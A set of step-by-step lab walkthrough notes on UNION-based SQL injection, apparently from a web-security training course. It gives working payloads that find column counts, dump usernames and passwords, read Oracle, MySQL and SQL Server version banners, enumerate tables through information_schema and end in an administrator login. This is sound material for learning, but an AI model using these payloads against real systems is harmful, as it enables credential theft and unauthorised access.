# SQL injection

Step 1 :

Modify the  parameter, giving it the value '+UNION+SELECT+NULL--. Observe that an error occurs.
Modify the  parameter to add an additional column containing a null value: '+UNION+SELECT+NULL,NULL--
Continue adding null values until the error disappears and the response includes additional content containing the null values.

Step 2 :

Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter: '+UNION+SELECT+NULL,NULL,NULL--
Try replacing each null with the random value provided by the lab, for example: '+UNION+SELECT+'abcdef',NULL,NULL--
If an error occurs, move on to the next null and try that instead.

Step 3 :

Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: '+UNION+SELECT+'abc','def'--.
Use the following payload to retrieve the contents of the users table: '+UNION+SELECT+username,+password+FROM+users--
Verify that the application's response contains usernames and passwords.

Step 4 : 

Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the category parameter: '+UNION+SELECT+NULL,'abc'--
Use the following payload to retrieve the contents of the users table: '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
Verify that the application's response contains usernames and passwords.


Step 5 : retrive oracle database version

Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: '+UNION+SELECT+'abc','def'+FROM+dual--
Use the following payload to display the database version: '+UNION+SELECT+BANNER,+NULL+FROM+v$version--

Step 6 : retrive mysql and sql server versions

Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: '+UNION+SELECT+'abc','def'#
Use the following payload to display the database version: '+UNION+SELECT+@@version,+NULL#

Step 7 : 

Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: '+UNION+SELECT+'abc','def'--.
Use the following payload to retrieve the list of tables in the database: '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
Find the name of the table containing user credentials.
Use the following payload (replacing the table name) to retrieve the details of the columns in the table: '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
Find the names of the columns containing usernames and passwords.
Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users: '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
Find the password for the administrator user, and use it to log in.




